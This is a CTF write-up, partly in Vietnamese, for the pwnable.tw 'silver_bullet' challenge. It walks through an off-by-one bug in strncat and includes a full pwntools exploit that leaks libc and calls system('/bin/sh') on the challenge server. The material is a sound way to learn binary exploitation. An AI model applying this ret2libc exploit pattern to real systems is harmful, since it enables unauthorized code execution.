# silver_bullet


## file

```shell
➜ silver_bullet ⚡                                                 20:52:52
▶ file silver_bullet
silver_bullet: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c95d92edf8bf47b6c9c450e882b7142bf656a92, not stripped
➜ silver_bullet ⚡                                                 21:12:59
▶ checksec silver_bullet
[*] '/mnt/d/pwn_myself/pwnable_tw/silver_bullet/silver_bullet'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```


## source

```c
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn start(int a1@<eax>, void (*a2)(void)@<edx>)
{
  int v2; // esi
  int v3; // [esp-4h] [ebp-4h] BYREF
  char *retaddr; // [esp+0h] [ebp+0h] BYREF

  v2 = v3;
  v3 = a1;
  _libc_start_main(main, v2, &retaddr, _libc_csu_init, _libc_csu_fini, a2, &v3);
  __halt();
}

///////////////////////////////////////////////////////////////////////

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int option; // eax
  int werewolf[2]; // [esp+0h] [ebp-3Ch] BYREF
  char bullet[48]; // [esp+8h] [ebp-34h] BYREF
  int v7; // [esp+38h] [ebp-4h]

  init_proc();
  v7 = 0;
  memset(bullet, 0, sizeof(bullet));
  werewolf[0] = 0x7FFFFFFF;
  werewolf[1] = "Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          option = read_int();
          if ( option != 2 )
            break;
          power_up(bullet);
        }
        if ( option > 2 )
          break;
        if ( option != 1 )
          goto LABEL_15;
        create_bullet(bullet);
      }
      if ( option == 3 )
        break;
      if ( option == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_15:
      puts("Invalid choice");
    }
    if ( beat(bullet, werewolf) )
      return 0;
    puts("Give me more power !!");
  }
}

///////////////////////////////////////////////////////////////////////

int menu()
{
  puts("+++++++++++++++++++++++++++");
  puts("       Silver Bullet       ");
  puts("+++++++++++++++++++++++++++");
  puts(" 1. Create a Silver Bullet ");
  puts(" 2. Power up Silver Bullet ");
  puts(" 3. Beat the Werewolf      ");
  puts(" 4. Return                 ");
  puts("+++++++++++++++++++++++++++");
  return printf("Your choice :");
}

///////////////////////////////////////////////////////////////////////

int __cdecl power_up(char *bullet)
{
  char bullet_add[48]; // [esp+0h] [ebp-34h] BYREF
  size_t power_after_add_bullet; // [esp+30h] [ebp-4h]

  power_after_add_bullet = 0;
  memset(bullet_add, 0, sizeof(bullet_add));
  if ( !*bullet )
    return puts("You need create the bullet first !");
  if ( *(bullet + 12) > 47u )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(bullet_add, 48 - *(bullet + 12));
  strncat(bullet, bullet_add, 48 - *(bullet + 12));
  power_after_add_bullet = strlen(bullet_add) + *(bullet + 12);
  printf("Your new power is : %u\n", power_after_add_bullet);
  *(bullet + 12) = power_after_add_bullet;
  return puts("Enjoy it !");
}

///////////////////////////////////////////////////////////////////////

int __cdecl create_bullet(char *bullet)
{
  size_t v2; // [esp+0h] [ebp-4h]

  if ( *bullet )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(bullet, 48u);
  v2 = strlen(bullet);
  printf("Your power is : %u\n", v2);
  *(bullet + 12) = v2;
  return puts("Good luck !!");
}


///////////////////////////////////////////////////////////////////////

int __cdecl beat(int bullet, int werewolf)
{
  int result; // eax

  if ( *bullet )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", *(werewolf + 4));
    printf(" + HP : %d\n", *werewolf);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000u);
    *werewolf -= *(bullet + 48);
    if ( *werewolf <= 0 )
    {
      puts("Oh ! You win !!");
      result = 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      result = 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    result = 0;
  }
  return result;
}

```


```shell
pwndbg> stack 50
00:0000│ esp 0xffa043e4 —▸ 0xffa043f4 ◂— 0x61616161 ('aaaa')
01:0004│     0xffa043e8 —▸ 0xffa043ec ◂— 0x7fffffff
02:0008│     0xffa043ec ◂— 0x7fffffff
03:000c│     0xffa043f0 —▸ 0x8048d06 ◂— inc edi /* 'Gin' */
04:0010│ eax 0xffa043f4 ◂— 0x61616161 ('aaaa')
... ↓        11 skipped
10:0040│     0xffa04424 ◂— 0x62626208
11:0044│ ebp 0xffa04428 ◂— 'bbbb'
12:0048│     0xffa0442c —▸ 0xf7d3b600 (__libc_start_main+192) ◂— add byte ptr [eax], 0


```

## Analysis

Mấy nay mình giải bài cứ bị không tìm ra bug, cứ bị ngáo ngơ í =="

- Bài này có 1 bug ở hàm **strncat**, chuỗi bullet có length là 0x30 tức 48bytes, ta có thể nhập trc 0x2f tức 47bytes, sau đó nhập tiếp 0x1 tức 1 byte nữa, khi nó nối chuỗi thì hiển nhiên byte null sẽ ghi đè lên stack tiếp theo, này là lỗi ***Off by one***. Lúc này bullet power tức length của bullet đang là 0x2f thành 0x00 do bị ghi đè, xong lúc update thì 0+1=1 => nhỏ hơn 47 => vẫn cho phép nhập bullet tiếp dẫn đến có thể ghi đè sau đó. 

Dưới đây là stack frame dựa theo IDA để vẽ:


|  stak       |                       |
|-------------|-----------------------|
|   ebp+0x8   |                       |
|   ebp+0x4   | ret                   |
|   ebp       | old ebp               |
|   ebp-0x4   | power bullet length   |
|   ebp-0x8   | bullet string         |
|   ...       | bullet string         |
|   ...       | bullet string         |
|   ...       | bullet string         |
|   ebp-0x34  | bullet string         |
|   ebp-0x38  | werewolf Name         |
|   ebp-0x3C  | werewolf HP           |


> Bình thường ở kiến trúc 32bit, trước khi call hàm nó sẽ :
>
>> Push tham số lên stack
>>
>> Tới call function thì sẽ push return address vào
>>
>> xong mới nhảy tới call funct

Thì ta chỉ cần thiết kế stack như vậy là được tức là:

|  stack      |                      |
|-------------|-----------------------|
|   ebp + 0xC | arg1 of puts          |
|   ebp+0x8   | ret of puts => main   |
|   ebp+0x4   | ret of main => puts   |
|   ebp       | old ebp               |


Sau khi mà leak được libc bằng cách gọi Puts với arg là puts got thì sẽ call lại main reload stack fram sau đấy sẽ tiếp tục như trước thay vì call puts thì call system thoi.

## exploit

```python
from pwn import *


binary = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")

context.binary = binary


if args.REMOTE:
    r = remote("chall.pwnable.tw", 10103)
else:
    r = process(binary.path)
    #gdb.attach(r,api=True)

payload = ""

r.recv()
r.sendline("1")
r.recv()
r.sendline("a"*0x2f)
r.recv()
r.sendline("2")
r.recv()
r.sendline("a"*0x1)
r.recv()
r.sendline("2")
r.recv()


log.info("Addr Puts func: " + hex(binary.plt['puts']))
log.info("Addr Puts func: " + hex(binary.got['puts']))
log.info("Addr Puts func: " + hex(binary.sym['main']))

payload = b"b"*7 + p32(binary.plt['puts']) + p32((binary.sym['main'])) + p32(binary.got['puts'])

r.sendline(payload)
r.recv()

r.sendline("3")
r.recv()
r.sendline("3")
print(r.recvuntil(b"win !!\n"))

sleep(0.2)
leak = r.recv(4)

log.info("LEAK: " + hex(u32(leak)))
puts_offset = libc.symbols['puts']
log.info("offset puts: " + hex(puts_offset))
libc.address = u32(leak) - puts_offset
log.info("Libc base: " + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']


r.sendline("1")
r.recv()
r.sendline("a"*0x2f)
r.recv()
r.sendline("2")
r.recv()
r.sendline("a"*0x1)
r.recv()
r.sendline("2")
r.recv()

payload = b"b"*7 + p32(system) + p32((binary.sym['main'])) + p32(bin_sh)

r.sendline(payload)

r.recv()
r.sendline("3")
r.recv()
r.sendline("3")
r.recv()

r.interactive()

```

